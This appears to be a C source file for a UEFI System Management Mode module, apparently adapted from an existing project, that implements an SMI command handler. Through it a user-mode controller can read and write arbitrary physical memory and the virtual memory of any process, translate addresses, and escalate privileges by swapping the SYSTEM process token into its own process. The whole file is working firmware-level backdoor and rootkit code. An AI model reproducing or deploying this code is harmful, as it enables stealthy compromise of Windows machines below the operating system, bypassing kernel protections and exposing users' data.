/** @file
  DioProcess SMM — Command handler implementation.
  Based on Deadwing Commands.c.
**/

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/BaseLib.h>

#include "Globals.h"
#include "Defs.h"
#include "Memory.h"
#include "Serial.h"
#include "Nt.h"

DIOPROCESS_LIVE_SESSION_INFO gLiveSession;

EFI_STATUS
EFIAPI
CmdPhysRead(
    IN VOID   *AddressToRead,
    IN VOID   *ReceivedInfo,
    IN UINT64  LengthToRead
    )
{
    SerialPrint("[ SMM ] Reading from physical memory\r\n");

    if ((!AddressToRead || !LengthToRead || !ReceivedInfo) || LengthToRead > BASE_4KB) {
        SerialPrint("[ SMM ] Invalid parameters\r\n");
        return EFI_INVALID_PARAMETER;
    }

    EFI_PHYSICAL_ADDRESS InterimPage;
    EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
    if (EFI_ERROR(Status)) {
        SerialPrint("[ SMM ] Unable to allocate intermediate page\r\n");
        return Status;
    }

    UINT64 PhysMapped = MemProcessOutsideSmramPhysMemory((UINT64)AddressToRead);
    if (PhysMapped != 0) {
        PhysMemCpy((VOID *)InterimPage, (VOID *)PhysMapped, (UINT32)LengthToRead);
        MemRestoreSmramMappings();

        UINT64 Consumer = MemMapVirtualAddress(ReceivedInfo, gLiveSession.UmController.UmControllerDirBase, NULL);
        if (Consumer == 0) {
            SerialPrint("[ SMM ] Unable to map consumer buffer\r\n");
            gSmst2->SmmFreePages(InterimPage, 1);
            return EFI_ABORTED;
        }

        PhysMemCpy((VOID *)Consumer, (VOID *)InterimPage, (UINT32)LengthToRead);
        MemRestoreSmramMappings();
    } else {
        SerialPrint("[ SMM ] Unable to map physical address\r\n");
        gSmst2->SmmFreePages(InterimPage, 1);
        return EFI_ABORTED;
    }

    gSmst2->SmmFreePages(InterimPage, 1);
    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
CmdPhysWrite(
    IN VOID    *AddressToWrite,
    IN VOID    *DataToWrite,
    IN UINT64   LengthToWrite
    )
{
    SerialPrint("[ SMM ] Writing to physical memory\r\n");

    if ((!AddressToWrite || !DataToWrite || !LengthToWrite) || LengthToWrite > BASE_4KB) {
        SerialPrint("[ SMM ] Invalid parameters\r\n");
        return EFI_INVALID_PARAMETER;
    }

    EFI_PHYSICAL_ADDRESS InterimPage;
    EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
    if (EFI_ERROR(Status)) {
        SerialPrint("[ SMM ] Unable to allocate intermediate page\r\n");
        return Status;
    }

    UINT64 Donor = MemMapVirtualAddress(DataToWrite, gLiveSession.UmController.UmControllerDirBase, NULL);
    if (Donor != 0) {
        PhysMemCpy((VOID *)InterimPage, (VOID *)Donor, (UINT32)LengthToWrite);
        MemRestoreSmramMappings();

        UINT64 PhysMapped = MemProcessOutsideSmramPhysMemory((UINT64)AddressToWrite);
        if (PhysMapped == 0) {
            SerialPrint("[ SMM ] Unable to map physical memory\r\n");
            gSmst2->SmmFreePages(InterimPage, 1);
            return EFI_ABORTED;
        }

        PhysMemCpy((VOID *)PhysMapped, (VOID *)InterimPage, (UINT32)LengthToWrite);
        MemRestoreSmramMappings();
    } else {
        SerialPrint("[ SMM ] Unable to map donor buffer\r\n");
        gSmst2->SmmFreePages(InterimPage, 1);
        return EFI_ABORTED;
    }

    gSmst2->SmmFreePages(InterimPage, 1);
    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
CmdVirtualRead(
    IN UINT64   TargetPid,
    IN VOID    *AddressToRead,
    IN VOID    *ReceivedInfo,
    IN UINT64   LengthToRead
    )
{
    SerialPrint("[ SMM ] Reading from virtual memory\r\n");

    if ((!AddressToRead || !LengthToRead || !ReceivedInfo) || LengthToRead > BASE_4KB || !TargetPid) {
        SerialPrint("[ SMM ] Invalid parameters\r\n");
        return EFI_INVALID_PARAMETER;
    }

    EFI_PHYSICAL_ADDRESS InterimPage;
    EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
    if (EFI_ERROR(Status)) {
        SerialPrint("[ SMM ] Unable to allocate intermediate page\r\n");
        return Status;
    }

    // Use VIRTUAL address for NtGetDirBaseByPid - it does page table walking internally
    UINT64 TargetDirBase = NtGetDirBaseByPid(TargetPid, gLiveSession.SysProcess.VaPsInitialSysProcess, gLiveSession.SysProcess.DirBase, NULL);
    if (TargetDirBase == 0) {
        SerialPrint("[ SMM ] Unable to get target process dir base\r\n");
        gSmst2->SmmFreePages(InterimPage, 1);
        return EFI_NOT_FOUND;
    }

    UINT64 TranslatedReadTarget = MemMapVirtualAddress(AddressToRead, TargetDirBase, NULL);
    if (TranslatedReadTarget == 0) {
        SerialPrint("[ SMM ] Unable to translate and map read address\r\n");
        gSmst2->SmmFreePages(InterimPage, 1);
        return EFI_ABORTED;
    }

    PhysMemCpy((VOID *)InterimPage, (VOID *)TranslatedReadTarget, (UINT32)LengthToRead);
    MemRestoreSmramMappings();

    UINT64 TranslatedConsumer = MemMapVirtualAddress(ReceivedInfo, gLiveSession.UmController.UmControllerDirBase, NULL);
    if (TranslatedConsumer == 0) {
        SerialPrint("[ SMM ] Unable to translate and map consumer address\r\n");
        gSmst2->SmmFreePages(InterimPage, 1);
        return EFI_ABORTED;
    }

    PhysMemCpy((VOID *)TranslatedConsumer, (VOID *)InterimPage, (UINT32)LengthToRead);
    MemRestoreSmramMappings();

    gSmst2->SmmFreePages(InterimPage, 1);
    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
CmdVirtualWrite(
    IN UINT64  TargetPid,
    IN VOID   *AddressToWrite,
    IN VOID   *DataToWrite,
    IN UINT64  LengthToWrite
    )
{
    SerialPrint("[ SMM ] Writing to virtual memory\r\n");

    if ((!AddressToWrite || !DataToWrite || !LengthToWrite) || LengthToWrite > BASE_4KB || !TargetPid) {
        SerialPrint("[ SMM ] Invalid parameters\r\n");
        return EFI_INVALID_PARAMETER;
    }

    EFI_PHYSICAL_ADDRESS InterimPage;
    EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
    if (EFI_ERROR(Status)) {
        SerialPrint("[ SMM ] Unable to allocate intermediate page\r\n");
        return Status;
    }

    // Use VIRTUAL address for NtGetDirBaseByPid - it does page table walking internally
    UINT64 TargetDirBase = NtGetDirBaseByPid(TargetPid, gLiveSession.SysProcess.VaPsInitialSysProcess, gLiveSession.SysProcess.DirBase, NULL);
    if (TargetDirBase == 0) {
        SerialPrint("[ SMM ] Unable to get target process dir base\r\n");
        gSmst2->SmmFreePages(InterimPage, 1);
        return EFI_NOT_FOUND;
    }

    UINT64 TranslatedDataDonor = MemMapVirtualAddress(DataToWrite, gLiveSession.UmController.UmControllerDirBase, NULL);
    if (TranslatedDataDonor == 0) {
        SerialPrint("[ SMM ] Unable to translate donor buffer address\r\n");
        gSmst2->SmmFreePages(InterimPage, 1);
        return EFI_ABORTED;
    }

    PhysMemCpy((VOID *)InterimPage, (VOID *)TranslatedDataDonor, (UINT32)LengthToWrite);
    MemRestoreSmramMappings();

    UINT64 TranslatedWriteAddress = MemMapVirtualAddress(AddressToWrite, TargetDirBase, NULL);
    if (TranslatedWriteAddress == 0) {
        SerialPrint("[ SMM ] Unable to translate target write address\r\n");
        gSmst2->SmmFreePages(InterimPage, 1);
        return EFI_ABORTED;
    }

    PhysMemCpy((VOID *)TranslatedWriteAddress, (VOID *)InterimPage, (UINT32)LengthToWrite);
    MemRestoreSmramMappings();

    gSmst2->SmmFreePages(InterimPage, 1);
    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
CmdCacheSessionInfo(
    IN UINT64  ControllerPid,
    IN VOID   *VirtualEprocess,
    IN UINT64  DirBase
    )
{
    SerialPrint("[ SMM ] Caching session info\r\n");

    if (!ControllerPid || !VirtualEprocess || !DirBase) {
        SerialPrint("[ SMM ] Invalid parameters\r\n");
        return EFI_INVALID_PARAMETER;
    }

    VOID *UmEprocess = NULL;
    UINT64 UmDirBase = 0;
    VOID *UnmappedSysEprocess = NULL;

    // First verify we can map PsInitialSystemProcess
    UINT64 PhysEprocess = MemMapVirtualAddress(VirtualEprocess, DirBase, &UnmappedSysEprocess);
    if (PhysEprocess == 0) {
        SerialPrint("[ SMM ] Unable to get physical address of PsInitialSystemProcess\r\n");
        return EFI_ABORTED;
    }
    MemRestoreSmramMappings();

    // Pass the VIRTUAL address, not the mapped one - NtGetDirBaseByPid will translate it
    UmDirBase = NtGetDirBaseByPid(ControllerPid, VirtualEprocess, DirBase, &UmEprocess);
    if (UmDirBase == 0 || UmEprocess == 0) {
        SerialPrint("[ SMM ] Cannot get dir base of the controller\r\n");
        return EFI_ABORTED;
    }

    gLiveSession.SysProcess.VaPsInitialSysProcess = VirtualEprocess;
    gLiveSession.SysProcess.PhysPsInitialSysProcess = (VOID *)UnmappedSysEprocess;
    gLiveSession.SysProcess.DirBase = DirBase;
    gLiveSession.UmController.PhysUmControllerEprocess = (VOID *)UmEprocess;
    gLiveSession.UmController.UmControllerDirBase = UmDirBase;

    SerialPrint("[ SMM ] Session info cached successfully\r\n");
    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
CmdVirtToPhys(
    IN  UINT64   TargetPid,
    IN  VOID    *AddressToTranslate,
    OUT VOID   **TranslatedAddress
    )
{
    SerialPrint("[ SMM ] Translating virtual address to physical\r\n");

    if (!TargetPid || !AddressToTranslate) {
        SerialPrint("[ SMM ] Invalid parameters\r\n");
        return EFI_INVALID_PARAMETER;
    }

    // Use VIRTUAL address for NtGetDirBaseByPid - it does page table walking internally
    UINT64 TargetDir = NtGetDirBaseByPid(TargetPid, gLiveSession.SysProcess.VaPsInitialSysProcess, gLiveSession.SysProcess.DirBase, NULL);
    if (TargetDir == 0) {
        SerialPrint("[ SMM ] Unable to get target process dirbase\r\n");
        return EFI_NOT_FOUND;
    }

    UINT64 Phys = MemTranslateVirtualToPhys(AddressToTranslate, TargetDir);
    if (Phys == 0) {
        SerialPrint("[ SMM ] Unable to translate virtual address\r\n");
        return EFI_ABORTED;
    }

    *TranslatedAddress = (VOID *)Phys;
    MemRestoreSmramMappings();

    return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
CmdEscalatePrivileges(
    VOID
    )
{
    SerialPrint("[ SMM ] Escalating privileges\r\n");
    return NtExchangeProcessToken(gLiveSession.SysProcess.PhysPsInitialSysProcess, gLiveSession.UmController.PhysUmControllerEprocess);
}

EFI_STATUS
EFIAPI
CmdMainHandler(
    IN PDIOPROCESS_COMMUNICATION SmiCommCtx
    )
{
    EFI_STATUS Status;
    VOID *VtopMem = NULL;

    switch (SmiCommCtx->Command) {
        case CMD_DIOPROCESS_PING_SMI:
            SerialPrint("[ SMM ] SMI handler is alive\r\n");
            Status = EFI_SUCCESS;
            break;
        case CMD_DIOPROCESS_READ_PHYS:
            Status = CmdPhysRead(SmiCommCtx->Read.PhysReadAddress, SmiCommCtx->Read.ReadResult, SmiCommCtx->Read.ReadLength);
            break;
        case CMD_DIOPROCESS_WRITE_PHYS:
            Status = CmdPhysWrite(SmiCommCtx->Write.PhysWriteAddress, SmiCommCtx->Write.DataToWrite, SmiCommCtx->Write.WriteLength);
            break;
        case CMD_DIOPROCESS_READ_VIRTUAL:
            Status = CmdVirtualRead(SmiCommCtx->Read.TargetProcessId, SmiCommCtx->Read.VaReadAddress, SmiCommCtx->Read.ReadResult, SmiCommCtx->Read.ReadLength);
            break;
        case CMD_DIOPROCESS_WRITE_VIRTUAL:
            Status = CmdVirtualWrite(SmiCommCtx->Write.TargetProcessId, SmiCommCtx->Write.VaWriteAddress, SmiCommCtx->Write.DataToWrite, SmiCommCtx->Write.WriteLength);
            break;
        case CMD_DIOPROCESS_CACHE_SESSION_INFO:
            Status = CmdCacheSessionInfo(SmiCommCtx->Cache.ControllerProcessId, SmiCommCtx->Cache.VaPsInitialSysProcess, SmiCommCtx->Cache.DirBase);
            break;
        case CMD_DIOPROCESS_VIRT_TO_PHYS:
            Status = CmdVirtToPhys(SmiCommCtx->Vtop.TargetPid, SmiCommCtx->Vtop.AddressToTranslate, &VtopMem);
            SmiCommCtx->Vtop.Translated = VtopMem;
            break;
        case CMD_DIOPROCESS_PRIV_ESC:
            Status = CmdEscalatePrivileges();
            break;
        default:
            SerialPrint("[ SMM ] Unknown command\r\n");
            Status = EFI_INVALID_PARAMETER;
            break;
    }

    return Status;
}
